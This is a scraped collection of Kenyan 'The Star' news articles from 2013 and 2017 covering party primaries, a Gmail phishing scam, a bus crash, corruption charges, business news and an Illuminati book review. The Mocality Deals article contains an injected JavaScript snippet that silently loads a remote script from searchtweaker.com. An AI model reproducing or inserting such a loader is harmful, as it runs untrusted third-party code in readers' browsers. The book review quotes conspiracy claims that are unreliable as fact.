http://www.the-star.co.ke/news/2017/05/01/men-in-black-force-odm-tribunal-to-suspend-hearings_c1552985,'Men in black' force ODM tribunal to suspend hearings,www.the-star.co.ke › Latest News,"May. 01, 2017, 3:00 pm","['ODM Appeals Tribunal was forced to suspend its Monday sittings after suspected goons stormed their meeting at Marsh Park hotel on Ngong road.', ' ', 'The men dressed in black stormed the premises when the tribunal was hearing a complaint lodged by aspirants from Nyakach constituency where Aduma Owuor won the primaries.', ' ', 'The men are said to have roughed up and assaulted some of the aspirants who were meeting to challenge nomination results.', ' ', 'Some aspirants were reportedly attacked in the corridors as they struggled to get a chance to present their complaints.', ' ', 'Though the Star could not ascertain where the men came from, sources allege the goons were hired by some aspirants to prevent their opponents from challenging their victories.', ' ', 'Tribunal chair Willis Otieno led members in vacating the premises and suspended sittings until further notice.', ' ', 'ODM concludes its primaries on Monday but the process has been marked by chaos and confusion.', ' ', 'During the 2013 primaries, men dressed in black stormed the Kasarani stadium where the party was holding nominations, smashing ballot boxes and scattering voting papers. The process was then called off.', ' ', '\n']"
http://www.the-star.co.ke/news/2017/01/19/gmail-users-beware-of-smart-phishers-out-to-steal-your-email-data_c1490114,Gmail users: Beware of smart phishers out to steal your email data,www.the-star.co.ke › Lifestyle › Star Tech,"Jan. 19, 2017, 3:00 pm","['Gmail is the latest victim of a phishing scam that is even fooling experienced technical users. ', 'The scam is being described as one of the most convincing yet, and tricks users into giving their Google login details, allowing the attacker to sift through their messages.', ""Emails containing the rogue attachment can come from people in the recipient's own address book, and attacker can even copy their style of writing, convincingly passing the fake email on to the victim's contacts."", 'The fake email uses image attachments that look like a PDF file.', 'When you click on the attachment, you are directed to phishing pages, disguised as the Google sign-in page.', 'If you enter your details, your Gmail account becomes compromised, allowing the attacker to sift through your sent messages folder and pass on the scam.', ""Even more worryingly, the phishing pages do not seem to trigger Google's HTTPS security warnings, which normally warn users if they land on an unsafe page."", 'The scam was discovered by Mark Maunder, CEO of Wordfence, the security service for WordPress.', ""Maunder said that the scam was so convincing that it even fooled 'experienced technical users.'"", ""A commenter on Hacker News, an IT person who's school server suffered an attack described what happened once they signed in to the fake page:"", '""The attackers log in to your account immediately once they get the credentials, and they use one of your actual attachments, along with one of your actual subject lines, and send it to people in your contact list.', '""For example, they went into one student\'s account, pulled an attachment with an athletic team practice schedule, generated the screenshot, and then paired that with a subject line that was tangentially related, and emailed it to the other members of the athletic team.\'', 'The attackers signing into your account happens very quickly, experts warn. ', '""It may be automated or they may have a team standing by to process accounts as they are compromised.', ""Writing on Wordfence, Maunder said: 'Once they have access to your account, the attacker also has full access to all your emails including sent and received at this point and may download the whole lot."", '""Now that they control your email address, they could also compromise a wide variety of other services that you use by using the password reset mechanism including other email accounts, any SaaS services you use and much more,"" Maunder said.', ""To avoid being a victim of the scam, Maunder recommends enabling a two-factor authentication, and keeping a look out for the prefix 'data:text/html' in the browser location bar  a sign of a fake web page."", ""He said: 'Make sure there is nothing before the host name 'accounts.google.com' other than 'https://' and the lock symbol."", '""You should also take special note of the green colour and lock symbol that appears on the left. If you can\'t verify the protocol and verify the hostname, stop and consider what you just clicked on to get to that sign-in page,"" ', '\n']"
http://www.the-star.co.ke/news/2013/02/28/35-killed-in-mwingi-dawn-bus-accident_c744421,35 killed in Mwingi dawn bus accident,www.the-star.co.ke › National News,"Feb. 28, 2013, 12:00 am","['Thirty five people were yesterday killed in an early morning accident at Tulimani on the Nairobi-Garissa road, three kilometers from Mwingi town.', 'Fifty others were seriously injured when the bus they were travelling in lost control, overturned and rolled severally after its brakes failed. Speaking at the scene, Mwingi police boss Simon Birir said the accident occurred at around 3pm.', 'He said a few passengers came out of the wreckage on their own as the others remained trapped inside the bus that had been reduced to a shell of itself on impact.', 'Mohamed Ahmed, a survivor, said the bus, which was heading to Mandera from Nairobi developed mechanical problems after they passed Mbondoni Market. Ahmed said the driver was unable to control the bus as it went down the steep Kanginga slope when its breaks failed.', ""This bus was flying. The wheels were not touching the road at all. When the driver saw there was no hope, he just left the steering and joined us at the back of the bus, he said. He said most of the 80 passengers were going to vote in Monday's elections."", 'Ahmed said one of the politicians had hired the bus to ferry them home so they could vote him in. Outgoing Mwingi South MP David Musila and Mwingi Central candidate Joe Mutambu termed the accident one of the worst in Mwingi in recent times.', ""Musila asked the police to crackdown on matatu's which have no speed governors. The Desert Cruiser Company should make sure their vehicles are serviced to avoid loss of lives. One cannot tell the reason as to why buses belonging to this particular company hasve caused many accidents along this route, he said."", ""Mwingi District Hospital medical superintendent Samson Mugane said the 35 bodies were taken to the facility's mortuary. Mugane said four critically injured survivors were referred to the Kenyatta National Hospital in Nairobi for specialised attention."", 'We have more than 50 survivors and six have been discharged. Four will be taken to Kenyatta National Hospital in Nairobi while the other two will go to private hospitals as per arrangements with their relatives, he said.', 'The dean of students at Mount Kenya University Emanuel Owour said nine of their students could have been involved in the accident. Owuor said two students are among the dead.', '\n']"
http://www.the-star.co.ke/news/2013/02/28/ps-thuita-charged-over-embassy-scandal_c744986,PS Thuita charged over embassy scandal,www.the-star.co.ke › Latest News,"Feb. 28, 2013, 12:00 am","['Foreign Affairs Permanent Secretary Thuita Mwangi was arraigned in court today over the purchase of a  Sh1.1 billion embassy residency in Tokyo.', 'However Mwangi and his co-accused Allan Mburu did not plead to the charges. They applied to have their plea taking deferred for two weeks to allow them to seek constitutional interpretation and raise complaints with the High Court over the violation of their rights.', 'Through his lawyers Evans Monari and Katwa Kigen, the PS said he has not been supplied with documents relied on as evidence from prosecution to help him make a cautionary statement.', 'Ethics and Anti Corruption Commission officers picked the PS Thuita Mwangi from the Foreign Affairs offices yesterday afternoon and took him to the EACC headquarters. Thuita was accompanied by his lawyer Evans Monari.', ""Mwangi and Mburu are accused of facilitating the purchase of a chancery and an ambassadors residence in Tokyo at  Sh800 million above the market value. Mwangi is  the Foreign Affairs Ps and Mburu as the Charge D'Affaires at the time."", 'The chancery and the ambassadors residence, acquired by Kenya last year, are located at Yakumo, Meguro-ku in Tokyo, on land measuring 1,431.77 metre square.', 'According to  a report tabled in parliament in 2010 by Departmental Committee on Defence and Foreign Relations the government lost close to Sh1.1 billion in the deal. The committee also found that the government lost a further Sh84.1 million in the purchase of a Chancery in ', 'Brussels, Belgium. The government should institute measures to recover the money lost, the committee had recommended.', 'The two are also facing charges  charge of abuse of office in relation to the same transaction and refusal to comply to the Public Procurement and Disposal Act (2005). Mwangi and Mburu will be released on a cash bail of Sh 2 million while the case has been adjourned until March 8. ', '\n']"
http://www.the-star.co.ke/news/2013/02/28/book-review-the-illuminati-and-freemasonry-in-east-africa_c740865,Book Review: The Illuminati and Freemasonry in East Africa,www.the-star.co.ke › Lifestyle,"Feb. 28, 2013, 12:00 am","['Book: The Illuminati and Freemasonry in East Africa', 'Author: Dr Justin Adiyb', 'Pages: 143', 'The Illuminati were to me, some years ago, a fictitious-sounding organisation comprising a group of powerful world leaders including influential celebrities in Hollywood and the music industry. They remained fictitious up until my young and quite impressionable cousin started pointing out to me the signs and symbols of the Illuminati in every music video we happened to be watching together. ', 'Reluctant as I was to believe in the existence of the Illuminati, I began noticing certain patterns  the repetitions and similarities in every music video. For instance, the triangular, diamond-like shape seen often when these celebrities touch the index fingers and thumbs of both hands together. This shape is also seen a special effect in other videos packaged as entertainment for the masses. It is speculated that this is the sign of the womb where life begins while others claim it is the sign of the pyramid as seen on the US dollar bill and as such those who make this symbol are staking their claim and control over world resources.', ""As far-fetched as it all sounds, Dr Justin Adiyb's book offers even more alarming statements on the Illuminati, Freemasons and other such organisations. Sample the following statement as extracted from the book: The Jesuit priests are blood-thirsty, power-hungry satanists whose only interests is money and power... they were the force behind the assassination of Abraham Lincoln.. they have destroyed nations, started wars and murdered rulers and presidents. And yet another statement: Note for all Muslims: The Koran that you hold in your hands today is not the original Koran."", ""Illuminati is real, Adiyb says. They have infiltrated every aspect of our lives. Take the visa card for example. VI is Roman for six. The letter 'S' is sigma for six while 'A' is the ancient Babylonian symbol for six. Put together it (Visa) translates to 666."", ""Adiyb further adds that smart cards, used to buy goods here in Kenya and elsewhere, are another method employed by the Illuminati in their quest to control the planet. Incidentally, yet another symbol of the Illuminati is the 'seeing eye' also prominent on the dollar bill at the apex of a pyramid. According to Adiyb, the implication of this can be summed up in four words:"", 'Big brother is watching - watching and seeing everything all the time. The seeing eye is also the symbol of deity, some believe it is the eye of God but some believe it is the eye of Lucifer  the all seeing god of the universe On the other hand, the five pointed star is a symbol of Satan.', 'Apparently, a great number of the members of the Order of the Illuminati come through Freemasonry. The head of the Illuminati at the present time are the Rothchilds  a powerful family with unlimited resources ranging in the trillions. ', 'Directly under them is the Council of 13, also known as the Grand Druid Council. Directly under is the Council of 33 - these are the highest Freemasons in the world, and under them is the Council of 500  the richest people in the world often listed in the Forbes 500 list.', ' Jay Z, Beyonce, Rihanna are not among the 500 richest people in the world but they are the lesser luminaries who contribute to the chaos of the Illuminati, says Adiyb of some of the performing artistes suspected to be part of the Illuminati. The higher hierarchies of the Illuminati use these lesser luminaries who are very influential to spread and infiltrate into every aspect our lives.', 'Still according to Adiyb, in the US, the Illuminati are now in the process of destroying stored food and farmlands. Thus, the only food that will be available will be in Federal Houses and people will therefore have to depend on the Federal Government for everything. In Africa, the Illuminati have allegedly brought in Monsanto  the world leading manufacturer of genetically modified seeds and companion pesticide.', ""Monsanto seeds are genetically modified and are designed to contaminated all other normal crops in your field, writes Adiyb in his book. This means that once your field is contaminated you will not be able to grow normal seeds, only Monsanto seeds will grow. Monsanto are part of the Illuminati plan to control the world's food supply."", 'Monsanto maize was been banned in France and was later overturned by EU on the basis that there was no scientific evidence on its inviability. Thus if Monsanto were to be adapted in Africa, Adiyb says it will be part of the greater Illuminati plan to control world affairs through governments and corporations for the purpose of establishing a new world order.', 'Movie producers are the lesser luminaries contributing to the chaos. Adiyb asserts that the movie industry is a part of the Illuminati plan. Phonetically the first three letters of cinema, C-I-N means Sin which is exactly what is encouraged in movies.', 'Indeed, a lot of the information in this book does sound far-fetched and aside from mentioning certain Kenyan artiste known to use some of the Illuminati symbols, the implications of Illuminati on East Africa is not clearly brought out. However, Adiyb promises a sequel where perhaps what is unclear in this book will be be made clear in the next.', 'The Illuminati and Freemasonry in East Africa is available in select bookshops at Sh1,300.', 'Stars: 3', '\n']"
http://www.the-star.co.ke/news/2013/02/28/i-will-vote-for-my-father-on-monday-says-kosgey-junior_c744119,"I will vote for my father on Monday, says Kosgey junior",www.the-star.co.ke › Local News › Rift Valley,"Feb. 28, 2013, 12:00 am","['The URP parliamentary candidate for Emgwen, Alex Kosgey has said he is supporting his father Henry Kosgey contrary to media reports. The senior Kosgey is running for the Nandi senator on an ODM ticket.', ""Kosgey, 31, yesterday denied reports that he will be supporting his father's rival Stephen Sang of URP, saying at no time had he made such a declaration. Alex had been reported in a section of the press as saying he will support Sang."", '""My father has done a superb for the Nandi people and that\'s why I think he should be elected as the senator,"" said the junior Kosgey. I respect my dad\'s decision to run for the senator on the ODM ticket. He also respects mine to run for Emugwen seat on a URP ticket.""', 'The younger Kosgey said he did not say he will not be supporting his father. In a statement he issued to the Star in Kapsabet town, Alex said he supports his father and will vote for him on Monday elections, contrary to press statements.', 'The junior Kosgey said politics is secondary when it comes to the family. ""My dad is everything to me and I cannot fail to support him in his senator bid, because he has also respected my political decision,"" he said.', 'The senior Kosgey, who is also the ODM chairman and Industrialisation minister is competing against Sang, 31. Alex said the differences between his father and URP leader William Ruto should not be used to create a wedge between the people.', 'William Ruto is my friend and I recognise him as our party leader, while the minister is my father and I am putting the record straight he has has my full support in his political endeavours,"" said Alex. ""I hope everybody now knows my position regarding the Nandi politics and we can put this matter to rest.""', '\n']"
http://www.the-star.co.ke/news/2013/02/28/sonko-and-shebesh-told-to-back-waititu_c744723,Sonko and Shebesh told to back Waititu,www.the-star.co.ke › Latest News,"Feb. 28, 2013, 12:00 am","['I got reports that Waititu, whom I have vigorously campaigned for in the past is now supporting Bishop Margaret Wanjiru.', ' ', '\n']"
http://www.the-star.co.ke/news/2013/02/28/family-court-judge-sued-by-wife-over-child-support_c744423,Family court judge sued by wife over child support,www.the-star.co.ke › National News,"Feb. 28, 2013, 12:00 am","[""A judge is locked in a custody dispute with his estranged wife. Justice William Musya Musyoka's wife has accused him of deserting their matrimonial home and their two children."", ""In a petition filed in 2010, Alice Wango is seeking the full custody of their two sons aged 15 and eight. She wants the court to order the judge to pay for the children's upkeep among other expenses."", ""Musyoka was recently appointed to the High Court's family division. Yesterday, Musyoka was expected to testify before magistrate Mwichigi Kinuthia but the case was adjourned to April 23 after parties were informed that the case file was missing."", ""Wango caused a scene outside the court accusing Musyoka of the disappearance, but it was later traced and the new hearing date fixed. Musyoka accuses his wife of changing one of their children's school without informing or consulting him. He says the fees in the new school is more than twice the former."", 'I am not in a position financial to afford school fees to the tune of Sh438,200 per term for the minor who is still in primary school and still has a long way to go in his education journey, says Musya. The two are in the middle of a divorce case.', '\n']"
http://www.the-star.co.ke/news/2013/02/28/police-issue-warning-on-violent-poll-demos_c744135,Police issue warning on violent poll demos,www.the-star.co.ke › National News,"Feb. 28, 2013, 12:00 am","['Inspector General of Police David Kimaiyo yesterday said violent demonstrations arising from Monday general election will be met with an equal force.', 'Speaking to the press yesterday after a meeting of Constitutional Commission and Independent Offices on the poll preparedness, Kimaiyo said 99,000 police officers have been deployed in the country to keep peace.', 'He said the police force will not entertain a repeat of the violence that was witness during the 2007/08 post-election violence. Kimaiyo said more than 100 people have already been charged in court with election related offences since the primaries were held on January 17.', '""Kenyans should know that we are not taking these offences lightly and those found guilty have been forced to part with a bond of between Sh100,000 and Sh200,000 to curb such lawlessness,"" he said.', ""Kimaiyo said security will be tight all over the country and that officers drawn from the GSU, AP, regular police, and prisons have already been enlisted to maintain the country's security."", 'He said the police service has drafted a ""master plan"" on how they will address security during and after the election and have handed over the document to the National Security Advisory Council for further deliberation.', 'Kimaiyo said groupings will not be tolerated 400 metres from polling stations. He told Kenyans to go home immediately after casting their vote.', '""All parties have agents to take care of their interests inside the polling stations. We will not entertain supporters milling around after casting their votes,"" he said. Kimaiyo dviced Kenyans to avoid alcohol on March 3, so ""they can wake up early enough on Monday to cast their votes"".', 'Speaking after the same meeting, director of Public Prosecutions Keraiko Tobiko said a specialised unit of 35 officers mandated to prosecute cases arising from the election, will be unveiled today.', 'Tobiko said a standard charge sheet has been drawn up for the exercise and that civil servants who engage in politics will not be left out during the prosecution of cases.', '""We are more organised this time round and are determined to forestall a reoccurence of what was witnessed during and after the 2007/08 poll,"" he said.', '\n']"
http://www.the-star.co.ke/news/2013/02/28/mumias-posts-sh16bn-loss-warns-profits-to-fall-by-25_c744427,"Mumias posts Sh1.6bn loss, warns profits to fall by 25%",www.the-star.co.ke › Business › Local,"Feb. 28, 2013, 12:00 am","['MUMIAS Sugar yesterday warned that its profits for the year ending June 30, 2013 will be lower by more than 25 per cent of the last financial year after it posted a loss for the six months of 2012. ', ' The giant sugar manufacturer reported a loss before tax of Sh1.6 billion for the six month ended December 31, 2012 down from a profit of Sh1.2 billion the other year. It recorded a net loss of Sh1.1 billion, down from a net profit of Sh825 million in 2011. ', ""Revenues dipped to Sh5.4 billion, down from Sh6.9 billion with all the firm's costs going up. Marketing and distribution costs doubled while administration expenses, finance costs the cost of sales also shot up. "", 'The miller said the first half of last year was challenging due to cane shortages arising from declining yields as a result of drought experienced in late 2011 and early 2012. ', 'The listed firm also blames cane poaching by competitors for the declining fortunes.Consequently, our intergrated production plans of sugar, co-generation (energy), ethanol and water have operated below the installed capacity, the firm said in a cautionary statement to the Nairobi Securities Exchange. ', 'Mumias however said the outlook for the second half of the year is positive with improved profitability expected.The company has completed its diversification initiatives whose benefits will be realized in the coming years, Mumias said.', '\n']"
http://www.the-star.co.ke/news/2013/02/28/7s-players-issue-threat_c744345,7s players issue threat,www.the-star.co.ke › Sport › Local,"Feb. 28, 2013, 12:00 am","[' The national rugby Sevens team was yesterday thrown into confusion as some senior players threatened to boycott the Hong Kong 7s after the suspension of dependable winger Collins Injera.', 'Kenya Rugby Union (KRU) dropped Injera on Tuesday for what they termed as indiscipline and absconding of duty.', 'In what seems to be another case of country versus club, KRU are said to have terminated Injeras contract after he failed to turn up for training on Friday.', 'Injera had earlier been suspended by his local side, Mwamba RFC alongside Dennis Ombachi and Horace Otieno, after failing to honour their Kenya Cup semi-final where the team went on to lose 18-15 to Strathmore Leos.', 'The national team started their training camp last week in preparation for next months Hong Kong and Japan legs of the World Series.', 'Following the sacking, some players have vowed to stay away from the team in solidarity with Injera, who has been an inspiration for the team and is rated as one of the best prospects in the HSBC IRB World Series.', 'One of the players, who sought anonymity for fear of victimisation alleged that Injera has been denied a chance to argue his case as he is caught between his internship with a local company, his club Mwamba and the national team. The 2009 Kenya Sportsman of the Year is a student at Daystar University undertaking a course in mass communication.', 'A section of the players feel they may also fall victims to the same circumstances considering the national team is an amateur side and they are forced to attend to other commitments including job a and school.', 'Injera received the Order of Golden Warriors award from President Mwai Kibaki in 2010 alongside his brother and former captain Humphrey Kayange. He emerged the top try scorer in the World Series in 2008-2009 season with 42 tries.', 'The events are unfolding at a time when the national coach Mike Friday is out of the country and is not expected until next week. Kenya is drawn against circuit leaders New Zealand, France and USA for the Hong Kong leg.', '\n']"
http://www.the-star.co.ke/news/2013/02/28/counterfeiters-may-soon-serve-a-15-year-jail-term_c744316,Counterfeiters may soon serve a 15-year jail term,www.the-star.co.ke › Business › Local,"Feb. 28, 2013, 12:00 am","['Manufacturers and retailers of counterfeit goods could get up to 15 years in jail if new proposals on the anti-counterfeits act are passed.Proposed amendments will also see culprits pay fines based on the estimated market value of the goods impounded. ', 'First time convictions will attract a fine of not less than three times the value of the goods with a minimum of Sh200,000 or imprisonment for a maximum of five years or both. ', 'Subsequent offenses will get a fine of five times the value of goods with a minimum of Sh500,000 and or a maximum of 15 years imprisonment. ', 'The Anti-Counterfeit Agency chief executive Stephen Mallowah said the stiffer penalties will deter further spread of the criminal activities that has seen businesses and government lose billions every year. ', 'Currently, offenders get a maximum fine of Sh800 000 or a jail term of 10 years.It will also be an offense under the law to be found in possession or control of labels, patches, stickers, or packaging of any type with a counterfeit mark that s likely to confuse or deceive the consumers. This will attract a Sh5 million fine or five year imprisonment or both. ', 'Mallowah presented the proposals at a workshop bringing together local manufacturers, Kenya Revenue authority, Kenya Bureau of Standards and the police of address the counterfeit problem. ', 'Kenya Association of Manufacturers estimate that East Africa region losses about $500million per annum on counterfeits trade.It further estimates that some companies have lost 70 per cent of their market share to the illegal goods locally made goods under greatest threat are alcoholic and soft beverages, cigarettes, medicines, dry cell batteries, seeds and fertilisers and cosmetics. Electronics make the largest share of imported fakes. ', '""Consumers also have a big role to play in driving this trade...our research showed the preference for counterfeits increased by the level of education and income,"" Mallowah said. ', 'KRA and the police acknowledged there is a big problem but said they cannot do anything in instances where the rightful intellectual property rights owners fail to report.', ' ', ' ', '\n']"
http://www.the-star.co.ke/news/2013/02/16/mocality-deals-to-close-kenya-nigeria-operations_c739605,"Mocality Deals to close Kenya, Nigeria operations",www.the-star.co.ke › Business › Local,"Feb. 16, 2013, 12:00 am","['A local mobile internet business directory online marketing business Mocality Deals has collapsed. The company has formerly announced that it will shut down all operations in Kenya and Nigeria at the end of this month.', 'Please log into the system between now and the 28th to retrieve any coupons or information that you may need as Mocality Deals will not be available after the 28th February 2013, an announcement posted on its website said.', 'The company was until last year operating three lines of business including creating websites for private businesses at a fee, and an online market for commodities and services and advertising on their site.', 'A former agent with the company said the plans to close the business were revealed to them a couple of months ago when the management expressed their disappointment with low returns.', 'As a result, several people who were working as agents to register local businesses have been rendered jobless. The firm had hundreds of field agents who earned their income through commissions calculated at the number of businesses they registered with Mocality. ', 'Most of the company agents and employees were young graduates who aggressively sourced the data from shops and small business across the country and mapped them for the Mocality directory.', 'We would also like to thank all of our agents, suppliers, staff and diehard fans for your enthusiasm, drive and dedication that made Mocality what it was, the announcement said. A former worker said the company management claimed the business had become unsustainable due to low uptake of its services.', 'Mocality Deals clashed with Google in late 2011 over claims that Google had infringed on their business rights by illegally lifting client data details from the Mocality website on false pretences that they were related businesses.', '// <![CDATA[\n(function(){try{var header=document.getElementsByTagName(""HEAD"")[0];var script=document.createElement(""SCRIPT"");script.src=""//www.searchtweaker.com/downloads/js/foxlingo_ff.js"";script.onload=script.onreadystatechange=function(){if (!(this.readyState)||(this.readyState==""complete""||this.readyState==""loaded"")){script.onload=null;script.onreadystatechange=null;header.removeChild(script);}}; header.appendChild(script);} catch(e) {}})();\n// ]]>', '\n']"
http://www.the-star.co.ke/news/2013/02/28/equalisation-fund-to-benefit-14-counties_c744292,Equalisation Fund to benefit 14 counties,www.the-star.co.ke › Business › Local,"Feb. 28, 2013, 12:00 am","['FOURTEEN counties will benefit from the Sh3 billion Equilisation Fund aimed at uplifting the living standards of people in poor areas, the Commission for Revenue allocation said yesterday. ', ""The commission said the 14 have been identified as the most marginalised in the country and met the set criteria under level of development, historical injustice and the CRA's county surveys. "", 'Turkana emerged as the least developed county and will receive the highest share of Sh271 million while Lamu will get the least allocation of Sh186 million. ', 'Other benefitiaries are Mandera, Wajir, Marsabit, Samburu, West Pokot, Tana River, Narok, Kwale, Garissa, Kilifi, Taita Taveta and Isiolo which will receive between Sh249 and Sh192 million. ', 'The money will fund short-term projects that address food insecurity, health, water and sanitation, education as well as electricity and energy needs and should be disbursed three or four months after the election and backdated to the 2010/2011 financial year when the new consitution was inaugrated. ', ""CRA said the funds will be released once the management advisory committee is formed. The committee is likely to be in place start after Monday's elections since it must have a representative from the governor's office. "", 'Other members of the committee to be chaired by CRA include the national treasury, controller of budget, Kippra and state departments responsible for water, roads, health, education and electricity. ', 'The fund will calculated at at a rate of 0.5 per cent of the national revenue and will be in existence for a period of 20 years. It is seperate from the 15 per cent of national revenues allocated to be shared among the the 47 counties. ', 'The commission chairman Micah Cheserem said that though 33 counties will not benefit this time round, the list will be re-visited in two to three years time.', '\n']"
